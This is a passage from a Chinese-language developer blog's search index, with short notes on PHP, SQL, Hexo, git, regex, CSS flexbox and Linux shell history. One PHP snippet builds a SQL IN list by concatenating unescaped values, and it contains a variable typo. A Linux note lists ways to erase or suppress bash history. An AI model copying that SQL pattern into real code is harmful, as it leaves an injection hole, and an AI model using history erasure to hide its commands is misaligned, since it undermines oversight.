\"\u003cbr /\u003e\"; } ","date":"2018-08-05","objectID":"/blog/posts/php-for%E8%BF%B4%E5%9C%88%E8%B7%91date-1%E9%81%8B%E7%AE%97%E8%A8%98%E9%8C%84/:3:0","tags":["php","date"],"title":"php for迴圈跑date+1天運算記錄","uri":"/blog/posts/php-for%E8%BF%B4%E5%9C%88%E8%B7%91date-1%E9%81%8B%E7%AE%97%E8%A8%98%E9%8C%84/"},{"categories":["PHP"],"content":"DatePeriod PHP: DatePeriod - Manual裡面的Traversable 可以用foreach，不過php裡面沒寫interface function讓我有點疑惑??? 感覺有很多東西可以寫，先筆記紀錄 參考來源: PHP - Loop Between Two Dates - TecAdmin.net PHP: DatePeriod - Manual I have 2 dates in PHP, how can I run a foreach loop to go through all of those days? - Stack Overflow ","date":"2018-08-05","objectID":"/blog/posts/php-for%E8%BF%B4%E5%9C%88%E8%B7%91date-1%E9%81%8B%E7%AE%97%E8%A8%98%E9%8C%84/:4:0","tags":["php","date"],"title":"php for迴圈跑date+1天運算記錄","uri":"/blog/posts/php-for%E8%BF%B4%E5%9C%88%E8%B7%91date-1%E9%81%8B%E7%AE%97%E8%A8%98%E9%8C%84/"},{"categories":["實用工具"],"content":"最近從logdown轉道github這邊 沒有圖片限制的問題 覺得用點動態圖片會比較好說明 有專門找一下實用錄製GIF工具 .錄屏工具，Mac推薦用GIPHY的，windows系統推薦用Honeycam和Gifcam。 推薦好用的錄製屏幕成Gif的軟件？ - 知乎 裡面我有用過Gifcam 不過我覺得沒有很好用 ScreenToGif 功能非常多 不過我也只用最簡單錄製功能 由於太好用了，我只需要紀錄推薦好用的錄製屏幕成Gif的軟件？ - 知乎 之前那篇文章沒有寫ScreenToGif，我之前只是先記錄一下這邊能寫的套件 某天進入發現有ScreenToGif就抓下來使用，發現真的很好用 還是免安裝 有截圖的需要的人可以用用看 ","date":"2018-08-05","objectID":"/blog/posts/PC%E5%AF%A6%E7%94%A8%E9%8C%84%E5%88%B6%E6%88%90GIF%E5%B7%A5%E5%85%B7-ScreenToGif/:0:0","tags":["gif"],"title":"PC實用錄制成GIF工具 - ScreenToGif","uri":"/blog/posts/PC%E5%AF%A6%E7%94%A8%E9%8C%84%E5%88%B6%E6%88%90GIF%E5%B7%A5%E5%85%B7-ScreenToGif/"},{"categories":["hexo"],"content":"最近文章越來越多了 應該是時候加入收尋功能 有時找新文章真的太麻煩了 雖然很簡單還是筆記一下 其實很簡單 簡單紀錄一下 在hexo站點目錄下執行npm install hexo-generator-searchdb --save Next主題config.yml設置 # Local search local_search: enable: true 基本上這樣就可以了 ##遇到奇怪錯誤問題 怎麼點搜尋一直轉圈圈 XML解析錯誤 \u003centry\u003e \u003ctitle\u003e\u003c![CDATA[Android手機電源鍵壞掉，開機方法]]\u003e\u003c/title\u003e \u003curl\u003e%2Fblog%2F2018%2F05%2F19%2FAndroid%E6%89%8B%E6%A9%9F%E9%9B%BB%E6%BA%90%E9%8D%B5%E5%A3%9E%E6%8E%89%EF%BC%8C%E9%96%8B%E6%A9%9F%E6%96%B9%E6%B3%95%2F\u003c/url\u003e \u003ccontent type=\"text\"\u003e\u003c![CDATA[最近紅米NOTE3電源鍵壞了很久，但是平常可以指紋辨識解鎖有幾次不小心關機，但是強按還是有辦法開機但今天不行了….，剛好買新機想備份LINE，但是無法開機我Google尋了很多方法最終採取fastboot開機法 小米手机电源键坏了怎么办？怎么开机啊？安卓手机手机学院_脚本之家這一篇使用結果沒用 FastBoot 紅米NOTE3 進入方法 音量键- + 电源键 3秒但是…，電源鍵壞掉…無法使用不過可以插電源線充電插入時，按下音量鍵-可以進入fastboot模式 最後，[Linux] fastboot 用法學習歸納 - 代碼家1234sudo add-apt-repository ppa:nilarimogard/webupd8### 我沒有執行上面，發現內鍵可以安裝sudo apt-get updatesudo apt-get install android-tools-adb android-tools-fastboot 安裝FastBoot進入root，fastboot reboot你的手機就會重新開機 愉悅~~~ 手機設定畫面，第二章圖可以設定自動撥放 https://developers.google.com/web/updates/2017/09/autoplay-policy-changes\u0008https://times.hinet.net/news/21737359 [Linux] fastboot 用法學習歸納 - 代碼家adb \u0026amp; fastboot 常用指令 – HTC Flash Zone]]\u003e\u003c/content\u003e \u003ccategories\u003e \u003ccategory\u003eAndroid\u003c/category\u003e \u003c/categories\u003e \u003ctags\u003e \u003ctag\u003eAndroid\u003c/tag\u003e \u003c/tags\u003e \u003c/entry\u003e 我猜是我的文章有跟xml衝突到 最後github issue看到关于文章里有非 utf-8 格式的字符时，搜索会卡住 · Issue #30 · wzpan/hexo-generator-search 改成JSON格式就能解決了 在hexo專案裡面config.yml(非主題裡面) # search ## [第三方服务集成 - NexT 使用文档](http://theme-next.iissnan.com/third-party-services.html#local-search) search: path: search.json field: post format: html limit: 10000 最後無聊逛到| 牧之 網站裡面有一隻貓 是用hexo-helper-live2d hexo live2d插件 2.0 ! | 幻想帖 EYHN/hexo-helper-live2d: Add the Sseexxyyy live2d to your hexo! 先記錄一下 參考來源: Hexo博客添加搜索功能 | IT范儿 第三方服务集成 - NexT 使用文档 ","date":"2018-08-05","objectID":"/blog/posts/hexo_search/:0:0","tags":["hexo","plugin"],"title":"hexo裝上搜尋功能(local search)","uri":"/blog/posts/hexo_search/"},{"categories":["Git"],"content":"git commit -amend可修改對上一個commit檔案 git add file git commit -amend 假如說明要變動可下 git commit -amend 'Hello World' 之前沒注意到git commit -amend可以對最後一個commit做修正 以為只能對commit 說明做修改 筆記筆記 不知道會不會對已經push repo有沒有影響 改天再實驗一下 1. Commit –amend【教學3 改寫提交】 | 連猴子都能懂的Git入門指南 | 貝格樂（Backlog） ","date":"2018-07-19","objectID":"/blog/posts/%E4%BF%AE%E6%94%B9%E6%9C%80%E5%BE%8C%E4%B8%80%E5%80%8Bcommit-%E4%BF%AE%E6%94%B9%E6%AA%94%E6%A1%88/:0:0","tags":["git","amend"],"title":"git修改最後一個commit(修改檔案)","uri":"/blog/posts/%E4%BF%AE%E6%94%B9%E6%9C%80%E5%BE%8C%E4%B8%80%E5%80%8Bcommit-%E4%BF%AE%E6%94%B9%E6%AA%94%E6%A1%88/"},{"categories":["MySQL"],"content":"之前前公司有用db2 value，現在用MySQL，找不太到類似與法 不過在IBM文件看到IBM Knowledge Center - VALUE這語法類似COALESCE 這麼實用的東西，當然不能忘記XD value(xxx,ooo) 假如xxx是null就帶入後面的值 COALESCE(xxx,ooo,zzz,fff,…) 同上面一樣方法，xxx為null的話，判斷下一個(ooo)是不是為null，ooo為null再繼續判斷下去 db2 value(xx,ooo) \u0026 COALESCE 參考來源: 德瑞克：SQL Server 學習筆記: SQL Server：認識 COALESCE() 函數 IBM Knowledge Center - VALUE ","date":"2018-07-19","objectID":"/blog/posts/mysql-COALESCE-%E5%8F%96%E4%BB%A3null%E5%80%BC%E5%A5%BD%E6%96%B9%E6%B3%95/:0:0","tags":["sql","mysql","value","coalesce"],"title":"mysql COALESCE 取代null值好方法","uri":"/blog/posts/mysql-COALESCE-%E5%8F%96%E4%BB%A3null%E5%80%BC%E5%A5%BD%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"由於目前公司開發團隊，有自訂PHP程式風格 但是規則跟PSR規則不太一樣 其中一個就是要true,false要大寫(drupal規範好像是要大寫) 平常我也都小寫orz 不知道當初訂製這個規則是不是有開發過drupal 最近使用phpfmt一直在找解決這個問題(常常忘記大寫orz) 最後研究出來，當然一定要筆記一下 有需要可能可以參考這篇 應該沒有什麼人需要吧 呵呵 找出phpfmt路徑 %USERPROFILE%\\.vscode\\extensions 進入phpfmt路徑(可搜尋phpfmt) 裡面有fmt.phar檔案 phar是類似php多隻程式打包成一個檔案，有一點跟jar一樣 但怎麼不能用zip打開orz 不過說真的打包過程很麻煩樣子 composer也不能直接做phar(可能沒有找到) 最後有Google到方法 ","date":"2018-07-18","objectID":"/blog/posts/phpfmt%E6%8A%8Atrue-false-null%E5%AD%98%E6%AA%94%E8%AE%8A%E5%A4%A7%E5%AF%AB-%E9%81%95%E5%8F%8Dpsr2-%E8%A7%A3%E5%87%BA-%E6%89%93%E5%8C%85phar/:0:0","tags":["phpfmt","psr2","phar","php","vscode"],"title":"phpfmt把true,false,null存檔變大寫(違反psr2)，解出/打包phar","uri":"/blog/posts/phpfmt%E6%8A%8Atrue-false-null%E5%AD%98%E6%AA%94%E8%AE%8A%E5%A4%A7%E5%AF%AB-%E9%81%95%E5%8F%8Dpsr2-%E8%A7%A3%E5%87%BA-%E6%89%93%E5%8C%85phar/"},{"categories":["實用工具"],"content":"解出phar php归档格式：phar文件详解（创建、使用、解包还原提取） - CSDN博客 $phar = new Phar('fmt.phar'); $phar-\u003eextractTo('fmt'); //提取一份原項目文件 $phar-\u003econvertToData(Phar::ZIP); //另外再提取一份，和上行二選一即可 ","date":"2018-07-18","objectID":"/blog/posts/phpfmt%E6%8A%8Atrue-false-null%E5%AD%98%E6%AA%94%E8%AE%8A%E5%A4%A7%E5%AF%AB-%E9%81%95%E5%8F%8Dpsr2-%E8%A7%A3%E5%87%BA-%E6%89%93%E5%8C%85phar/:0:1","tags":["phpfmt","psr2","phar","php","vscode"],"title":"phpfmt把true,false,null存檔變大寫(違反psr2)，解出/打包phar","uri":"/blog/posts/phpfmt%E6%8A%8Atrue-false-null%E5%AD%98%E6%AA%94%E8%AE%8A%E5%A4%A7%E5%AF%AB-%E9%81%95%E5%8F%8Dpsr2-%E8%A7%A3%E5%87%BA-%E6%89%93%E5%8C%85phar/"},{"categories":["實用工具"],"content":"打包phar 參考苗栗縣教育處資訊教育中心 - 打包多個php檔案變成phar執行檔 \u003c?php $p=new Phar('./fmt.phar'); $p-\u003esetStub(file_get_contents('fmt.stub.php'));//入口網頁 $p-\u003ebuildFromDirectory('.');//不確定要有 ","date":"2018-07-18","objectID":"/blog/posts/phpfmt%E6%8A%8Atrue-false-null%E5%AD%98%E6%AA%94%E8%AE%8A%E5%A4%A7%E5%AF%AB-%E9%81%95%E5%8F%8Dpsr2-%E8%A7%A3%E5%87%BA-%E6%89%93%E5%8C%85phar/:0:2","tags":["phpfmt","psr2","phar","php","vscode"],"title":"phpfmt把true,false,null存檔變大寫(違反psr2)，解出/打包phar","uri":"/blog/posts/phpfmt%E6%8A%8Atrue-false-null%E5%AD%98%E6%AA%94%E8%AE%8A%E5%A4%A7%E5%AF%AB-%E9%81%95%E5%8F%8Dpsr2-%E8%A7%A3%E5%87%BA-%E6%89%93%E5%8C%85phar/"},{"categories":["實用工具"],"content":"無法解出phar問題 因為在公司不知道為什麼?phar一直失敗 注意資料夾是不是唯讀 確定php.ini有沒有把phar.readonly = Off phar.readonly前面有沒有把; del掉(我就是卡在這邊orz) 要怎麼知道command line 的php.ini是吃哪裡?預設應該是php目錄裡面（PS:phpfmt是對應OS環境變數path裡面php) easyphp - How to find the php.ini file used by the command line? - Stack Overflow php -i可以看裡面設定內容，可以看到phar.readonly有沒有關閉才能正確執行 phar參考連結 akalongman/fmt: Tooling for PHP - testing, code coverage and formatting 如何解包还原一个phar文件 PHP的学习–使用phar打包 - 疯狂的原始人 - 博客园 苗栗縣教育處資訊教育中心 - 打包多個php檔案變成phar執行檔 easyphp - How to find the php.ini file used by the command line? - Stack Overflow Phar建立與使用 | ScarShow | 刀疤說 修改完成 最後修改完php 做上面打包動作 覆蓋fmt.phar，即可完成 fmt_smt.php修改部分 if ('true' === $lcText || 'false' === $lcText || 'null' === $lcText) { $lcText = strtoupper($text); } if ( ( ('TRUE' === $lcText || 'FALSE' === $lcText || 'NULL' === $lcText) \u0026\u0026 !$this-\u003eleftUsefulTokenIs([ 很麻煩的話，可以下載我改過的:D 打包完的phar檔案需要的話可以自取 fmt.phar下載 最後設定檔下面可以拿掉 \"phpfmt.psr2\": false, 不過psr2除了小寫，不知道還有做什麼事情= =a ","date":"2018-07-18","objectID":"/blog/posts/phpfmt%E6%8A%8Atrue-false-null%E5%AD%98%E6%AA%94%E8%AE%8A%E5%A4%A7%E5%AF%AB-%E9%81%95%E5%8F%8Dpsr2-%E8%A7%A3%E5%87%BA-%E6%89%93%E5%8C%85phar/:0:3","tags":["phpfmt","psr2","phar","php","vscode"],"title":"phpfmt把true,false,null存檔變大寫(違反psr2)，解出/打包phar","uri":"/blog/posts/phpfmt%E6%8A%8Atrue-false-null%E5%AD%98%E6%AA%94%E8%AE%8A%E5%A4%A7%E5%AF%AB-%E9%81%95%E5%8F%8Dpsr2-%E8%A7%A3%E5%87%BA-%E6%89%93%E5%8C%85phar/"},{"categories":["實用工具"],"content":" phpfmt sublime text3 phpfmt插件使用 - eerTime vscode-php-cs-fixer 在 vs code 使用 php cs fixer 進行 coding style 的格式修正 | Codefun php-cs-fixer 使用 PHP-CS-Fixer 自动规范化你的 PHP 代码 - dingdayu的个人空间 - 开源中国 不知道為什麼裝phpfmt，我vscode不用設定什麼東西就能跑了 後來決定用這個XD 設定方式也很方便 沒試用的套件 sample-vscode-php-cs-fixer PHP Formatter vscode 中使用php-cs-fixer和PHP Formatter 插件规范化PHP代码 - HTL - 博客园 可先在作業系統環境path加入php執形資料夾 下載php解壓縮出來，設定作業環境的path 公司PHP設定 TRUE、FALSE、NULL 要大寫 // psr2檢查要關掉 if class switch 需要換行 // AllmanStyleBraces \"phpfmt.passes\": [\"AllmanStyleBraces\"], \"phpfmt.psr2\": false, \"[php]\": { \"editor.formatOnSave\": true } \"editor.formatOnSave\": true vscode檔案編輯頁面還原git好像會有問題…… 但影響不大…… 這篇好像沒有寫什麼重點 呵呵= =||| ","date":"2018-07-18","objectID":"/blog/posts/vscode-%E5%A5%97%E4%BB%B6%E8%AA%BF%E6%95%B4PHP-code-style-%E4%BD%BF%E7%94%A8%E8%A8%98%E9%8C%84/:0:0","tags":["PHP","vscode","PSR"],"title":"vscode 套件調整PHP code style 使用記錄","uri":"/blog/posts/vscode-%E5%A5%97%E4%BB%B6%E8%AA%BF%E6%95%B4PHP-code-style-%E4%BD%BF%E7%94%A8%E8%A8%98%E9%8C%84/"},{"categories":["PHP"],"content":"高職我第一翻開的書是PHP 從以前我就知道’\u0026“在PHP的差別 但我沒有深入了解….. 今天踩到一個雷 A PHP Error was encountered Severity: Notice Message: Undefined variable: date 我發現我字串這樣寫 \u003c?php $date = date(\"Y-m-d\"); echo \"$date之後要做什麼\"; 其實後來發現$date後面要空白，不能連在一起 同一個雷，不希望一直踩到 就筆記筆記吧 下面是官網範例，簡單講\"“包起來遇到$就會抓取變數 不管是陣列還是物件都可以抓到 但注意$var後面字串要分格空白 當然也可以用{}包起來，但要相連在一起 \u003c?php // 顯示所有錯誤 error_reporting(E_ALL); $great = 'fantastic'; // 無效，輸出: This is { fantastic} echo \"This is { $great}\"; // 有效，輸出： This is fantastic echo \"This is {$great}\"; echo \"This is ${great}\"; // 有效 echo \"This square is {$square-\u003ewidth}00 centimeters broad.\"; $juices = array(\"apple\", \"orange\", \"koolaid1\" =\u003e \"purple\"); echo \"He drank some $juices[0] juice.\".PHP_EOL; echo \"He drank some $juices[1] juice.\".PHP_EOL; echo \"He drank some juice made of $juice[0]s.\".PHP_EOL; // Won't work echo \"He drank some $juices[koolaid1] juice.\".PHP_EOL; class people { public $john = \"John Smith\"; public $jane = \"Jane Smith\"; public $robert = \"Robert Paulsen\"; public $smith = \"Smith\"; } $people = new people(); echo \"$people-\u003ejohn drank some $juices[0] juice.\".PHP_EOL; echo \"$people-\u003ejohn then said hello to $people-\u003ejane.\".PHP_EOL; echo \"$people-\u003ejohn's wife greeted $people-\u003erobert.\".PHP_EOL; echo \"$people-\u003erobert greeted the two $people-\u003esmiths.\"; // Won't work 多加s 害我一直再看哪裡有問題orz /* * * 下面特殊狀況 * */ //有效 echo \"This square is {$square-\u003ewidth}00 centimeters broad.\"; // 有效，只有通過花括號語法才能正確解析帶引號的鍵名 // 這個雷我可能還不知道 echo \"This works: {$arr['key']}\"; // 有效 echo \"This works: {$arr[4][3]}\"; //沒有帶key的字串可以不用{} ex:$arr[4][3] // 這是錯誤的表達式，因為就像 $foo[bar] 的格式在字符串以外也是錯的一樣。 // 換句話說，只有在 PHP 能找到常量 foo 的前提下才會正常工作；這裡會產生一個 // E_NOTICE (undefined constant) 級別的錯誤。 echo \"This is wrong: {$arr[foo][3]}\"; // 有效，當在字符串中使用多重數組時，一定要用括號將它括起來 echo \"This works: {$arr['foo'][3]}\"; // 有效 echo \"This works: \" . $arr['foo'][3]; echo \"This works too: {$obj-\u003evalues[3]-\u003ename}\"; /** * 下面很神奇，可以用function return 字串出來，但不能直接用function回傳字串 * 感覺不是很實用... */ echo \"This is the value of the var named $name: {${$name}}\"; echo \"This is the value of the var named by the return value of getName(): {${getName()}}\"; echo \"This is the value of the var named by the return value of \\$object-\u003egetName(): {${$object-\u003egetName()}}\"; // 無效，輸出： This is the return value of getName(): {getName()} echo \"This is the return value of getName(): {getName()}\"; 函數、方法、靜態類變量和類常量只有在 PHP 5 以後才可在 {$} 中使用。然而，只有在該字符串被定義的命名空間中才可以將其值作為變量名來訪問。只單一使用花括號 ({}) 無法處理從函數或方法的返回值或者類常量以及類靜態變量的值。 \u003c?php // 顯示所有錯誤 error_reporting(E_ALL); class beers { const softdrink = 'rootbeer'; public static $ale = 'ipa'; } $rootbeer = 'A \u0026 W'; $ipa = 'Alexander Keith\\'s'; // 有效，輸出： I'd like an A \u0026 W echo \"I'd like an {${beers::softdrink}}\\n\"; // 也有效，輸出： I'd like an Alexander Keith's echo \"I'd like an {${beers::$ale}}\\n\"; ?\u003e 以前我記得PHP有一個HEREDOC 但剛剛看文件5.3以後有一個NOWDOC heredoc 語法結構 nowdoc 語法結構（自 PHP 5.3.0 起） heredoc可以用$var 帶變數 但是nowdoc不會帶入$var變數 nowdoc用在XML會比較不會有問題 官網範例 \u003c?php $str = \u003c\u003c\u003c'EOD' Example of string spanning multiple lines using nowdoc syntax. EOD; /* 含有变量的更复杂的示例 */ class foo { public $foo; public $bar; function foo() { $this-\u003efoo = 'Foo'; $this-\u003ebar = array('Bar1', 'Bar2', 'Bar3'); } } $foo = new foo(); $name = 'MyName'; echo \u003c\u003c\u003c'EOT' My name is \"$name\". I am printing some $foo-\u003efoo. Now, I am printing some {$foo-\u003ebar[1]}. This should not print a capital 'A': \\x41 EOT; ?\u003e ","date":"2018-07-04","objectID":"/blog/posts/php%E5%AD%97%E4%B8%B2%E7%AC%A6%E8%99%9F%E5%B8%B6%E8%AE%8A%E6%95%B8%E7%94%A8%E6%B3%95/:0:0","tags":["PHP","String","HEREDOC","NOWDOC"],"title":"php字串\"符號帶變數用法","uri":"/blog/posts/php%E5%AD%97%E4%B8%B2%E7%AC%A6%E8%99%9F%E5%B8%B6%E8%AE%8A%E6%95%B8%E7%94%A8%E6%B3%95/"},{"categories":["PHP"],"content":"echo boolean 沒有東西原因 PHP: String 字符串 - Manual 之前不知道為什麼echo boolean沒有出來東西 現在知道為什麼了 一個布爾值 boolean 的 TRUE 被轉換成 string 的 “1”。Boolean 的 FALSE 被轉換成 “\"（空字符串）。這種轉換可以在 boolean 和 string 之間相互進行。 一個整數 integer 或浮點數 float 被轉換為數字的字面樣式的 string（包括 float 中的指數部分）。使用指數計數法的浮點數（4.1E+6 數組 array 總是轉換成字符串 “Array”，因此，echo 和 print 無法顯示出該數組的內容。要顯示某個單元，可以用 echo $arr[‘foo’] 這種結構。要顯示整個數組內容見下文。 在 PHP 4 中對象 object 總是被轉換成字符串 “Object”，如果為了調試原因需要打印出對象的值，請繼續閱讀下文。為了得到對象的類的名稱，可以用 get_class() 函數。自 PHP 5 起，適當時可以用 __toString 方法。 資源 resource 總會被轉變成 “Resource id #1” 這種結構的字符串，其中的 1 是 PHP 在運行時分配給該 resource 的唯一值。不要依賴此結構，可能會有變更。要得到一個 resource 的類型，可以用函數 get_resource_type()。 NULL 總是被轉變成空字符串。 如上面所說的，直接把 array，object 或 resource 轉換成 string 不會得到除了其類型之外的任何有用信息。可以使用函數 print_r() 和 var_dump() 列出這些類型的內容。 PHP: String 字符串 - Manual 看來有空來補這個筆記 PHP: 類型轉換的判別 - Manual 還發現PHP String有長度限制2GB 結果原本要記錄一個東西，越記越多XD 發現很多書都沒有教很清楚orz ","date":"2018-07-04","objectID":"/blog/posts/php%E5%AD%97%E4%B8%B2%E7%AC%A6%E8%99%9F%E5%B8%B6%E8%AE%8A%E6%95%B8%E7%94%A8%E6%B3%95/:0:1","tags":["PHP","String","HEREDOC","NOWDOC"],"title":"php字串\"符號帶變數用法","uri":"/blog/posts/php%E5%AD%97%E4%B8%B2%E7%AC%A6%E8%99%9F%E5%B8%B6%E8%AE%8A%E6%95%B8%E7%94%A8%E6%B3%95/"},{"categories":["Regex"],"content":"這次專案有用到 email 學生任證，有想一個用 email 方法 但這次需求要把一些教育信箱排除在外… 查了一下 regex 好像沒法對特定單字做 不過我有實做一個方法(不知道有沒有漏洞) ","date":"2018-07-03","objectID":"/blog/posts/Regex-%E6%8E%92%E9%99%A4%E5%96%AE%E5%AD%97%E6%96%B9%E6%B3%95-Lookarounds/:0:0","tags":["regex","lookarounds"],"title":"Regex 排除單字方法(Lookarounds)","uri":"/blog/posts/Regex-%E6%8E%92%E9%99%A4%E5%96%AE%E5%AD%97%E6%96%B9%E6%B3%95-Lookarounds/"},{"categories":["Regex"],"content":"a(?!xxx) 不會抓 axxx，但會抓 ax,axx,aoxxx 的a ","date":"2018-07-03","objectID":"/blog/posts/Regex-%E6%8E%92%E9%99%A4%E5%96%AE%E5%AD%97%E6%96%B9%E6%B3%95-Lookarounds/:0:1","tags":["regex","lookarounds"],"title":"Regex 排除單字方法(Lookarounds)","uri":"/blog/posts/Regex-%E6%8E%92%E9%99%A4%E5%96%AE%E5%AD%97%E6%96%B9%E6%B3%95-Lookarounds/"},{"categories":["Regex"],"content":"a(?=xxx) 會抓 axxx 的a ","date":"2018-07-03","objectID":"/blog/posts/Regex-%E6%8E%92%E9%99%A4%E5%96%AE%E5%AD%97%E6%96%B9%E6%B3%95-Lookarounds/:0:2","tags":["regex","lookarounds"],"title":"Regex 排除單字方法(Lookarounds)","uri":"/blog/posts/Regex-%E6%8E%92%E9%99%A4%E5%96%AE%E5%AD%97%E6%96%B9%E6%B3%95-Lookarounds/"},{"categories":["Regex"],"content":"(?:xxx) 2019-12-08 這邊 xxx 一樣是連詞 ^I like (?:dogs|penguins), but not (?:lions|tigers).$ Regular Expression for Or | “|” Regex | Regular Expression I | OCPsoft 不會算 group 最後再沒有找到資料情況下，有例用上面 3 個想到一個方法 @(?!nfu)\\S*edu.tw 例用(?!xxx)跟\\S(非空白字符) 真的太久沒有寫會忘 orz 我每次都是寫的時候再查 \\s 元字符用于查找空白字符。 空白字符可以是： 空格符 (space character) 制表符 (tab character) 回车符 (carriage return character) 换行符 (new line character) 垂直换行符 (vertical tab character) 换页符 (form feed character) http://www.w3school.com.cn/js/jsref_regexp_whitespace.asp regex - Regular expression to match a line that doesn’t contain a word? - Stack Overflow 還有看到這篇，但好像不實用 Regex Cheat Sheet看到裡面還有很多不會 感覺還有更深的東西。有時間再食用。 2019-07-25 今天在改 PHP 程式，由於要改一些程式把xxx_line去除掉 但是跟 PHP __LINE__衝突 不過後來找到正規化去除(?\u003c!_)_line 無聊技術研究: RegExp 應用： lookahead , lookbehind 備份圖 裡面有提到lookahead(往前看) Positive lookahead ： a(?=Y) Negative lookahead ： a(?!Y) 剛我這個例子是用lookbehind(往後看) 之前沒有記錄到 Positive lookbehind ： (?\u003c=Y)a Negative lookbehind： (?\u003c!Y)a 參考來源： regex – 排除单词/字符串的正则表达式 - 代码日志 regex - Regular expression to match a line that doesn’t contain a word? - Stack Overflow Match string not containing string - Regex Tester/Debugger 正则的扩展 - ECMAScript 6 入门 Regex 群組與環顧 Groups \u0026 Lookaround - 正規表示法教學 Regular Expression Tutorial 備份圖 ","date":"2018-07-03","objectID":"/blog/posts/Regex-%E6%8E%92%E9%99%A4%E5%96%AE%E5%AD%97%E6%96%B9%E6%B3%95-Lookarounds/:0:3","tags":["regex","lookarounds"],"title":"Regex 排除單字方法(Lookarounds)","uri":"/blog/posts/Regex-%E6%8E%92%E9%99%A4%E5%96%AE%E5%AD%97%E6%96%B9%E6%B3%95-Lookarounds/"},{"categories":["SQL"],"content":"今天思緒有點短路，做SQL用程式組兩個NOT IN 竟然用OR，可能覺得跟IN一樣 但事後想想應該是要用AND 不可能有一個要NOT IN另外一個不用NOT IN 好了這個雷紀錄一下，不要再踩到 IN(xxx,ooo) =\u003e IN (xxx) or IN(ooo)= NOT IN(xxx,ooo) =\u003e NOT IN (xxx) AND NOT IN(ooo) ","date":"2018-07-03","objectID":"/blog/posts/SQL-not-in-in-%E6%8B%86%E9%96%8B%E5%AF%AB%E6%B3%95/:0:0","tags":["NOT IN","IN","sql"],"title":"SQL not in \u0026 in 拆開寫法","uri":"/blog/posts/SQL-not-in-in-%E6%8B%86%E9%96%8B%E5%AF%AB%E6%B3%95/"},{"categories":["PHP"],"content":"由於mysql處理IN效能不是很好，大量資料做的時候速度會很慢 有用PHP程式動態產生SQL，今天有看到很好用的寫法 筆記一下 NOTE主要用substr減少最後一個, 再放入SQL變數裡面去 寫起來很簡單 \u003c? $filter = $list = ''; if(is_array($array_uid)){ foreach($array_uid as $user_val){ $list .= \"'\".$user_val['uid'].\"'\"; $list .= \",\"; } $list = substr($list, 0, -1); $fliter = \" AND u.uid NOT IN (\".$list.\") \"; } $sql = \"select * from xxx where 1=1 $filter \"; ","date":"2018-07-03","objectID":"/blog/posts/PHP-%E7%94%A2%E7%94%9F%E5%8B%95%E6%85%8Bsql%E6%8A%80%E5%B7%A7-IN/:0:0","tags":["PHP","sql","IN","NOT IN"],"title":"PHP 產生動態sql技巧(IN)","uri":"/blog/posts/PHP-%E7%94%A2%E7%94%9F%E5%8B%95%E6%85%8Bsql%E6%8A%80%E5%B7%A7-IN/"},{"categories":["CSS"],"content":"今天看到官網Bootstrap 4的Nabars，好奇他的Navbar怎麼排版的 發現竟然是使用flex去編排，但是搜尋位置竟然可以靠右 中間空白是怎麼用的??查了一下，發現他有使用margin 究竟flex和margin碰在一起會產生甚麼化學反應呢? 讓我們紀錄吧!!! 在講flex之前，我就有紀錄過margin搭配position可以置中，但其他是有公式的 ‘margin-left’ + ‘border-left-width’ + ‘padding-left’ + ‘width’ + ‘padding-right’ +‘border-right-width’ + ‘margin-right’ = width of containing block margin-left: auto;为什么可以使的元素靠右 - SharkU的回答 - SegmentFault 思否 margin-right 不设置的话默认是0，width 定宽之后，margin-left取值为 auto ，自动占据了剩余的全部宽度，具体见 《css权威指南》 P170 studyFiles/CSS权威指南（第三版）(jb51.net).pdf at master · threerocks/studyFiles bootstrap 4 是用 左邊最後一個元素加上margin-right:auto 右邊會靠右 當然反過來也可以在左邊search 加上margin-left:auto 在簡書看到我想知道的東西(備份:https://screenshots.firefox.com/0gK3HJq4OS6WkyCk/www.jianshu.com) Flex布局算法中对auto margins的对齐原理有如下解释，原文是英文，我尽量准确翻译： 在主轴（main axis）方向 如剩余空间为正数，则剩余空间会被平均分配在拥有主轴方向auto margin(s)的flex元素之间。 如剩余空间为负数，则将主轴方向的auto margin(s)设定为‘0’。 看过这些例图，auto margins的使用方法应该不会忘了吧。最后再来提个醒儿： auto margins仅针对当前的flex item，对其子元素无效。 在计算flex-bases与flexible lengths （main size与cross size）时，auto margins取值为0。 auto margins优先于justify-content与align-self。由于相应方向上的剩余空间已分配给auto margins，justify-content与align-self将无效。 auto margins对溢出的（overflowing）flex item无效。 作者：蜂蜜柚子茶 链接：https://www.jianshu.com/p/beeb93a76830 來源：简书 沒想到還能這樣用，筆記筆記… ","date":"2018-07-02","objectID":"/blog/posts/flex-margin-right-auto-%E5%8F%B3%E9%82%8A%E5%85%83%E7%B4%A0%E9%9D%A0%E5%8F%B3-%E5%8F%83%E8%80%83bootstrap4-navbar/:0:0","tags":["flex","CSS","margin"],"title":"flex margin-right:auto 右邊元素靠右(參考bootstrap4 navbar)","uri":"/blog/posts/flex-margin-right-auto-%E5%8F%B3%E9%82%8A%E5%85%83%E7%B4%A0%E9%9D%A0%E5%8F%B3-%E5%8F%83%E8%80%83bootstrap4-navbar/"},{"categories":["Linux"],"content":"有時因為要測試指令 會大量留下不能用的指令到history上面 今天就搜尋一下，發現XYZ的筆記本: Linux Bash 刪除 history 指令操作歷史紀錄 有講要怎麼清除，有測試成功!!! ** 以下擷取XYZ的筆記本: Linux Bash 刪除 history 指令操作歷史紀錄 ** 只刪除這次登入後的操作紀錄： 方法一：清空 HISTFILE 變數內容，則登出時，不會將本次操作紀錄儲存到 HISTFILE 設定的檔案。 # unset HISTFILE 方法二：將 HISTSIZE 設為0，下「history」指令時，也不會列出指令(記憶體中沒存放指令紀錄?)，則登出時，不會更新記錄檔內容(?)。 (註：參考資料是寫會刪除全部紀錄，但我測試是只有不會儲存本次操作紀錄) # HISTSIZE=0 方法三：強制刪除本次登入 Bash 的 PID，則本次操作紀錄，不會儲存到記錄檔。 # kill -9 $$ 感覺最實用是方法3kill -9 $$ 清除所有history發法 # history -c # history -w 詳細可以去看一下鳥哥 鳥哥的 Linux 私房菜 – 第十章、認識與學習BASH 另外還有HISTCONTROL方法 Linux Bash環境下，輸入指令不留痕跡的作法 :: 哇哇3C日誌 今天還看到HISTORY可以用Ctrl+R 找過去打的指令 Linux 指令歷史紀錄（History）的操作教學與範例 - G. T. Wang 參考來源: XYZ的筆記本: Linux Bash 刪除 history 指令操作歷史紀錄 鳥哥的 Linux 私房菜 – 第十章、認識與學習BASH Linux Bash環境下，輸入指令不留痕跡的作法 :: 哇哇3C日誌 Linux 指令歷史紀錄（History）的操作教學與範例 - G. T. Wang 